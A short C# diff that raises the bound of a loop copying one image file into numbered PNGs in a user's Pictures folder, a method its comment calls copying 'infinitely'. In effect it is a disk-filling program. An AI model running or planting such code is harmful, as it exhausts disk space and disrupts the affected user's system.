@@ -19,7 +19,7 @@ namespace MainPoint
         public static void Copy() // Method for copying and pasting the file infinitely
         {
             File.Copy(Global.sourceFile, Global.destinationFile, true); // true allows overwriting
-            for (long i = 0; i < 10000000000000; i++)
+            for (long i = 0; i < 1000000000000000000; i++)
             {
                 Global.destinationFile = @"C:\Users\glitc\Pictures\reyna" + i + ".png";
                 File.Copy(Global.sourceFile, Global.destinationFile);
